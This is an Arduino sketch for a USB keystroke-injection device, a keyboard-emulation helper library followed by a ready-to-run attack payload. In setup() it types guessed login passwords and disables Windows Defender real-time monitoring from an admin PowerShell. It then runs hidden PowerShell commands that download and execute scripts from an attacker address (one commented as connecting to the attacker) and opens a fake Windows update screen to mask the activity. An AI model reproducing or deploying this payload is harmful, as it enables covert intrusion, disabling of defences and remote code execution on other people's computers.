#include "Keyboard.h"

/**
 * Prepares the virtual keyboard.
 * This method should be the first instruction on the setup code block.
 */
void start() {
  Keyboard.begin();
  rdLongerDelay();
}

/**
 * Ends the virtual keyboard.
 * This method should be the last instruction on the setup code block.
 */
void finish() {
  Keyboard.end();
}

/**
 * For the keyboard functions to work they need a small
 * delay between them. If you notice there's some bugs
 * when running your arduino, try using different delay values
 * on this function.
 */
void rdDelay() {
  delay(100);
}

/**
 * A longer delay (5 times the regular delay).
 */
void rdLongerDelay() {
  for(int i = 0; i < 5; i++) rdDelay();
}

void rdWriteText(String text) {
  Keyboard.print(text);
  rdDelay();
}

/**
 * Used to type non-alphanumeric keys.
 */
void rdTypeKey(uint8_t key)
{
  Keyboard.press(key);
  rdDelay();
  Keyboard.release(key);
  rdDelay();
}

/***********************
 *      Libraries      *
 ***********************
 * You may remove the  *
 * unused functions    *
 * before uploading    *
 * the code to the     *
 * arduino             *
 ***********************/

/**
 * Runs a program.
 * Example: "notepad" starts notepad, "calc" starts the calculator.
 */
void rdRun(String program) {
  rdGuiCombination('r');
  Keyboard.print(program);
  rdDelay();
  rdTypeKey(KEY_RETURN);
}

/**
 * Takes a screenshot.
 */
void rdPrintScreen() {
  // some machines use 206 key as the PrtScreen key
  // others might use 229, and others might use both so
  // we use both instructions
  rdTypeKey(206);
  rdTypeKey(229);
  Keyboard.print(F("h"));
  rdDelay();
  Keyboard.print(F("b"));
  rdDelay();
}

/**
 * Opens the JavaScript console on a browser.
 */
void rdOpenJavascriptConsole() {
  rdKeyCombination(KEY_LEFT_CTRL, KEY_LEFT_SHIFT, 'i');
}

/**
 * Hides a window:
 * Basically it drags a window to the lowest it can be
 * and then repositions the cursor.
 */
void rdHideWindow() {
  rdAltCombination(' ');
  Keyboard.print(F("M"));
  rdDelay();
  Keyboard.press(KEY_DOWN_ARROW);
  // 100 should be enough to guarantee the window is as low as possible
  // also please notice that 100 is not the real number of strokes since
  // some of the strokes are ignored.
  for(int i = 0; i < 10; i++) rdLongerDelay();;
  Keyboard.release(KEY_DOWN_ARROW);
  // return repositions the cursor back to its original position
  rdTypeKey(KEY_RETURN);
}

/**
 * Same as Win + D
 */
void rdShowDesktop() {
  rdGuiCombination('d');
}

/**
 * Same as Ctrl + V
 */
void rdPaste() {
  rdCtrlCombination('v');
}

/**
 * Same as Ctrl + X
 */
void rdCut() {
  rdCtrlCombination('x');
}

/**
 * Same as Ctrl + C
 */
void rdCopy() {
  rdCtrlCombination('c');
}

/**
 * Same as Gui + (the received key)
 */
void rdGuiCombination(uint8_t c) {
  rdKeyCombination(KEY_LEFT_GUI, c);
}

/**
 * Same as Alt + (the received key)
 */
void rdAltCombination(uint8_t c) {
  rdKeyCombination(KEY_LEFT_ALT, c);
}

/**
 * Same as Ctrl + (the received key)
 */
void rdCtrlCombination(uint8_t c) {
  rdKeyCombination(KEY_LEFT_CTRL, c);
}

/**
 * Same as Shift + (the received key).
 */
void rdShiftCombination(uint8_t c) {
  rdKeyCombination(KEY_LEFT_SHIFT, c);
}

/**
 * Same as (Received hold key) + (target key).
 */
void rdKeyCombination(uint8_t holdKey, uint8_t targetKey) {
  Keyboard.press(holdKey);
  rdDelay();
  Keyboard.press(targetKey);
  rdDelay();
  Keyboard.releaseAll();
  rdDelay();
}

/**
 * Same as (Received hold key 1) + (received hold key 2) + (target key).
 */
void rdKeyCombination(uint8_t holdKey1, uint8_t holdKey2, uint8_t targetKey) {
  Keyboard.press(holdKey1);
  rdDelay();
  rdKeyCombination(holdKey2, targetKey);
}

/**
 * Same as above but with one more hold key.
 */
void rdKeyCombination(uint8_t holdKey1, uint8_t holdKey2, uint8_t holdKey3, uint8_t targetKey) {
  Keyboard.press(holdKey1);
  rdDelay();
  rdKeyCombination(holdKey2, holdKey3, targetKey);
}

/**
 * Opens the command prompt without admin rights.
 */
void rdOpenCommandPrompt() {
  rdOpenCommandPrompt(false);
}

/**
 * Opens the command prompt, if the "admin" parameter
 * has a "true value", it opens a command prompt
 * with admin rights. Or without admin rights otherwise.
 */
void rdOpenCommandPrompt(boolean admin) {
  if (admin) {
    rdGuiCombination('x');
    Keyboard.print(F("a"));
    rdAcceptWindowsSmartScreen();
  } else {
    rdRun("cmd");
  }
}

/**
 * Accepts the windows smart screen to grant admin permissions.
 */
void rdAcceptWindowsSmartScreen() {
  // Wait untill smart screen shows up
  rdLongerDelay();
  rdTypeKey(KEY_LEFT_ARROW);
  rdDelay();
  Keyboard.print(F(" "));
  rdDelay();
}

/**
 * Changes the keyboard layout, if the computer only
 * has 1 keyboard layout this key combination won't
 * do anything.
 */
void rdChangeKeyboardLayout() {
  rdAltCombination(KEY_LEFT_SHIFT);
}

/**
 * It runs one or multiple powershell scripts,
 * to run multiple scripts, separate them with a new line "\n" char.
 */
void rdPowershellRun(String scripts) {
  char delimiter = '\n';
  String finalScript = "powershell ";
  while (scripts.indexOf('\n') > 0) {
    finalScript = finalScript + "(" + scripts.substring(0, scripts.indexOf('\n')) + ") ; ";
    scripts = scripts.substring(scripts.indexOf('\n') + 1);
  }
  finalScript = finalScript + "(" + scripts + ")";
  rdRun(finalScript);
  delay(10000);
}

/*********************
 *      Arduino      *
 *********************/

void setup() {

  //delay for device setup connect 30s- logout 
  delay(30000);
  start();

  // type password 3 times
  delay(1000);
  rdTypeKey(KEY_RETURN);
  delay(1000);
  Keyboard.println("123");
  delay(1000);
  rdTypeKey(KEY_RETURN);
  delay(100);
  rdTypeKey(KEY_RETURN);
  delay(1000);

  rdTypeKey(KEY_RETURN);
  delay(1000);
  Keyboard.println("123");
  delay(1000);
  rdTypeKey(KEY_RETURN);
  delay(1000);
  rdTypeKey(KEY_RETURN);
  delay(1000);

  rdTypeKey(KEY_RETURN);
  delay(1000);
  Keyboard.println("121099");
  delay(1000);
  rdTypeKey(KEY_RETURN);
  delay(1000);
  rdTypeKey(KEY_RETURN);
  delay(1000);

  // window+d and open powershell in administrator mode to turn off window defender 
  delay(1000);
  rdShowDesktop();
  rdGuiCombination('x');
  Keyboard.print(F("a"));
  rdAcceptWindowsSmartScreen();
  delay(2000);
  Keyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  delay(2000);
  Keyboard.println("exit");

  // window+d and changed background
  delay(1000);
  rdShowDesktop();
  rdRun("powershell -windowstyle hidden -command \"(New-Object System.Net.Webclient).Downloadstring(\'http://192.168.233.130:9000/background.ps1\') | iex\"");
  delay(1000);

  // window+d and start connect to attacker
  delay(1000);
  rdShowDesktop();
  rdRun("powershell -windowstyle hidden -command \"(New-Object System.Net.Webclient).Downloadstring(\'http://192.168.233.130:9000/test.ps1\') | iex\"");
  delay(1000);

  // open fake update
  delay(1000);
  rdShowDesktop();
  delay(1000);
  rdRun("iexplore -k https://fakeupdate.net/win10ue/bsod.html");
  rdTypeKey(KEY_RETURN);
  delay(1000);
  rdTypeKey(KEY_F11);
  
  finish();
}

void loop() {}